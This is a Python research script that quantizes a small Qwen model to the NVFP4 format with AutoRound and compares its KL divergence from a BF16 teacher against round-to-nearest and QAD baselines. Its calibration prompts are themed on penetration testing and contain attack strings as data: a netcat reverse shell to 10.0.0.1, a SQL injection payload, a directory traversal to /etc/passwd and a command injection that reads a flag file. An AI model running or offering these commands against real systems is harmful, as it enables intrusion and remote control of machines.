"""
AutoRound Experiment — FP4 edition (Option B: same number format as NVFP4).

AutoRound uses sign gradient descent to optimize the rounding direction of each
weight during quantization. No extra parameters are added — the weights themselves
are better placed within the FP4 grid.

Format alignment with QAD (Option B):
  QAD       — NVFP4 via ModelOpt   (data_type=nvfp4 internally)
  AutoRound — NVFP4 via AutoRound  (data_type="nv_fp4")
  Both produce true NVFP4: E2M1 + block=16 + two-level FP8/FP32 scaling.
  Comparison is now genuinely apples-to-apples — only the optimization method differs.

Same measurement structure as qad_experiment.py for direct comparison:
  Oracle KL  : BF16 vs BF16 ≈ 0                   (shared target)
  RTN    KL  : BF16 vs FP4 round-to-nearest        (iters=0, quantization damage)
  Post-AR KL : BF16 vs FP4 AutoRound               (after sign-grad opt)
  % recovered = (RTN_KL - post_KL) / (RTN_KL - oracle_KL)

Knobs: GROUP_SIZE · ITERS · TEMPERATURE · MAX_NEW_TOKENS · PROMPTS
"""

import time
import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM
from auto_round import AutoRound

# ── CONFIG ────────────────────────────────────────────────────────────────────

MODEL_NAME     = "Qwen/Qwen3-0.6B"   # swap to 14B on server
DEVICE         = "cuda" if torch.cuda.is_available() else "cpu"
MAX_NEW_TOKENS = 80
TEMPERATURE    = 2.0
BITS           = 4          # FP4 E2M1 — fixed, matches NVFP4 number format
GROUP_SIZE     = 16         # NVFP4 spec: 16 weights per block (enforced by auto_round)
ITERS          = 200        # sign-grad steps (paper default)

# Same prompts as qad_experiment.py — same calibration domain
PROMPTS = [
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
]

# ── MODEL LOADING ─────────────────────────────────────────────────────────────

print(f"Device: {DEVICE}  |  Model: {MODEL_NAME}\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token


def load_bf16(frozen: bool = False) -> torch.nn.Module:
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )
    if frozen:
        model.eval()
        for p in model.parameters():
            p.requires_grad = False
    return model


# ── CALIBRATION DATA ──────────────────────────────────────────────────────────

def generate_calibration_data(
    teacher: torch.nn.Module,
    prompts: list[str],
    max_new_tokens: int,
) -> list[torch.Tensor]:
    sequences = []
    print("Generating calibration sequences from teacher...")
    for prompt in prompts:
        input_ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            output = teacher.generate(
                input_ids,
                max_new_tokens=max_new_tokens,
                do_sample=True,
                temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(output)
        print(f"  [{len(sequences)}/{len(prompts)}] {output.shape[1]} tokens")
    print(f"Calibration data: {len(sequences)} sequences\n")
    return sequences


# ── KL MEASUREMENT ────────────────────────────────────────────────────────────

def measure_kl(
    model_a: torch.nn.Module,
    model_b: torch.nn.Module,
    data: list[torch.Tensor],
    temperature: float,
    label: str,
) -> float:
    model_a.eval()
    model_b.eval()
    total = 0.0
    with torch.no_grad():
        for seq in data:
            la = model_a(input_ids=seq).logits.clamp(-100, 100)
            lb = model_b(input_ids=seq).logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(lb / temperature, dim=-1),
                F.softmax(la  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total += kl.item()
    avg = total / len(data)
    print(f"  {label:<55} KL = {avg:.4f}")
    return avg


# ── AUTOROUND ─────────────────────────────────────────────────────────────────

def run_autoround(
    model: torch.nn.Module,
    iters: int,
    calibration_data: list[torch.Tensor],
    group_size: int = GROUP_SIZE,
    seqlen: int = 64,
) -> None:
    """
    AutoRound: sign gradient descent to find optimal rounding direction per weight.

    data_type="fp" selects FP4 E2M1 — same number format as NVFP4.
    iters=0   → pure RTN (baseline, no optimization)
    iters=200 → default from the SignRound paper
    """
    cal_texts = [
        tokenizer.decode(seq[0], skip_special_tokens=True)
        for seq in calibration_data
    ]
    autoround = AutoRound(
        model=model,
        tokenizer=tokenizer,
        bits=BITS,
        group_size=group_size,
        iters=iters,
        dataset=cal_texts,
        seqlen=seqlen,
        data_type="nv_fp4",   # true NVFP4 — same format as ModelOpt's QAD output
        device_map=DEVICE,
    )
    autoround.quantize()
    model.to(DEVICE)


# ── MAIN ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":

    print("=== Loading Teacher (BF16, frozen) ===")
    teacher = load_bf16(frozen=True)

    print("\n=== Generating Calibration Data ===")
    calibration_data = generate_calibration_data(teacher, PROMPTS, MAX_NEW_TOKENS)

    # ── Baselines ─────────────────────────────────────────────────────────────
    print("=== Baselines ===")

    kl_oracle = measure_kl(
        teacher, teacher, calibration_data, TEMPERATURE,
        "Oracle — BF16 vs BF16",
    )

    print("\n  Loading FP4-RTN model (AutoRound iters=0)...")
    rtn_model = load_bf16()
    t0 = time.perf_counter()
    run_autoround(rtn_model, iters=0, calibration_data=calibration_data)
    rtn_time = time.perf_counter() - t0

    kl_rtn = measure_kl(
        teacher, rtn_model, calibration_data, TEMPERATURE,
        "RTN — FP4 E2M1 round-to-nearest (iters=0)",
    )
    del rtn_model
    torch.cuda.empty_cache()

    total_gap = kl_rtn - kl_oracle

    # ── AutoRound optimization ─────────────────────────────────────────────────
    print(f"\n=== AutoRound (iters={ITERS}) ===")
    ar_model = load_bf16()

    t0 = time.perf_counter()
    run_autoround(ar_model, iters=ITERS, calibration_data=calibration_data)
    ar_time = time.perf_counter() - t0

    kl_post = measure_kl(
        teacher, ar_model, calibration_data, TEMPERATURE,
        f"Post-AR — FP4 E2M1 AutoRound (iters={ITERS})",
    )

    # ── Results ───────────────────────────────────────────────────────────────
    recovered = kl_rtn - kl_post
    pct       = recovered / total_gap * 100 if total_gap > 0 else 0.0

    print(f"""
=== Full Comparison ===
  Oracle  (BF16, target)              : {kl_oracle:.4f}
  RTN     (FP4 E2M1, no opt)         : {kl_rtn:.4f}   time: {rtn_time:.1f}s
  Post-AR (FP4 E2M1, sign-grad opt)  : {kl_post:.4f}   time: {ar_time:.1f}s

  Gap closed : {recovered:.4f} / {total_gap:.4f} = {pct:.1f}% recovered toward oracle

Config: bits={BITS}  group_size={GROUP_SIZE}  iters={ITERS}  T={TEMPERATURE}  data_type=fp
Knobs  : GROUP_SIZE · ITERS · TEMPERATURE · MAX_NEW_TOKENS · PROMPTS

--- vs QAD (from qad_experiment.py) ---
  Both target FP4 E2M1 number format (Option B — same grid, fair KL comparison).
  QAD  recovers accuracy via KL distillation into the quantized weights (ModelOpt STE).
  AR   recovers accuracy by optimizing rounding direction during quantization.
  Post KL is directly comparable — lower = closer to BF16 teacher.""")
